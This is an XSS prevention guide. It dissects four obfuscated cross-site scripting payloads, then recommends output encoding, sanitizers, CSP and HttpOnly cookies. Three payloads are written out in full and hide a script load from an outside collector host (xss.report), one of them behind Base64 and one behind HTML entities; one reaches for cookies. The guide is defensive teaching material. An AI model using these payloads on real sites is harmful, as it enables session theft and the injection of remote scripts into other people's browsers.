# Cross-Site Scripting (XSS) Prevention & Mitigation Guide

This guide details defense-in-depth methodologies to secure modern web applications against advanced, obfuscated, and modern Cross-Site Scripting (XSS) payloads.

---

## 1. Breakdown of Sophisticated XSS Payloads

The following examples dissect various evasion techniques used by attackers, explaining the execution triggers and target vulnerabilities:

### A. Obfuscated Event Triggers & Reflection
**Payload Example:**
```html
"><a nope%3d"%26quot%3bx%26quot%3b"onmouseover%3d"Reflect.get(frames,'ale'%2b'rt')(Reflect.get(document,'coo'%2b'kie'))">'"><script src=https://xss.report/c/zh></script>
```
*   **Vector:** HTML attribute breakout and reflective property retrieval.
*   **Mechanism:** Uses `Reflect.get` and string concatenation (`'ale' + 'rt'`) to obtain references to standard JavaScript functions without triggering WAF signatures matching `alert` or `document.cookie`.
*   **Defensive Trigger:** Executed when the user hovers over the injected link tag or through automated UI triggers.

### B. Base64-Encoded Payloads
**Payload Example:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3poIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```
*   **Vector:** Broken resource image events with decoded inputs.
*   **Mechanism:** The malicious payload is Base64-encoded and stored inside the `id` attribute. When the `src` fails to load (triggering the `onerror` event), the handler uses `atob()` to decode the script from the ID and runs it via `eval()`.
*   **Defensive Trigger:** Executed immediately during DOM load/rendering.

### C. Iframe Entity Injection
**Payload Example:**
```html
"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/zh&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
```
*   **Vector:** HTML5 `srcdoc` iframe rendering.
*   **Mechanism:** Inside the `srcdoc` attribute, the HTML markup is completely encoded in decimal character entities (`&#60;` for `<`, etc.). The browser automatically decodes and parses this code inside the iframe context, running the nested script which accesses the `parent.document` context.
*   **Defensive Trigger:** Executed automatically as soon as the iframe is loaded.

### D. Modern CSS Scroll-Snap Change Events
**Payload Example:**
```html
"><address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
```
*   **Vector:** Layout-driven modern CSS/HTML event handlers.
*   **Mechanism:** Uses CSS scroll snapping properties in tandem with the modern `onscrollsnapchange` event to execute a string-concatenated `eval(atob(...))` script payload, causing automatic trigger upon layout rendering without user input.

---

## 2. Core Security Best Practices & Defensive Mitigations

To prevent all variations of the above attacks, follow these fundamental secure development practices:

### A. Context-Aware Output Encoding (Escaping)
Always encode user-controlled variables dynamically based on their insertion context:
*   **HTML Body:** Replace `<`, `>`, `&`, `"`, `'`, `/` with their corresponding entity strings (e.g., `&lt;`, `&gt;`, etc.).
*   **HTML Attribute:** Ensure attribute quotes are secure, and convert all non-alphanumeric characters to their respective entity/hexadecimal representations to prevent breakout.
*   **JavaScript Context:** Use dedicated JSON serializers/escapers instead of raw interpolation (e.g., `const data = <%= escape_javascript(user_input) %>`).

### B. Strict Input Sanitization
When accepting user-generated HTML/rich-text:
*   **Use DOMPurify (Client-Side):** A highly hardened and battle-tested HTML sanitizer. It strips dangerous elements (`<script>`, `<iframe>`, `<svg>`), nested attributes, and modern layout/event handlers (`onload`, `onerror`, `onscrollsnapchange`).
*   **Server-Side Sanitizers:** Implement backend sanitization (e.g., using Python's `bleach` or Rails ActionView sanitizer) with explicit tag and attribute allowlists.

### C. Content Security Policy (CSP)
A strong CSP is the strongest defense-in-depth measure to stop payload execution:
*   **Eliminate Inline Scripts:** Do not include `'unsafe-inline'` under `script-src`. Always use secure cryptographic nonces or script file hashes.
*   **Block Dynamic Code Execution:** Keep `'unsafe-eval'` completely out of your CSP rules. This nullifies any attempt to use `eval()`, `atob()`, or dynamic function generation.
*   **Restrict Frame & Object Embedding:** Enforce strict controls via `frame-src 'self'` or `child-src 'self'`.

### D. Secure HTTP-Only Flags
To block attackers from stealing active session tokens via `document.cookie`, always set appropriate session cookie attributes:
```http
Set-Cookie: session_token=secret_value; Secure; HttpOnly; SameSite=Strict
```
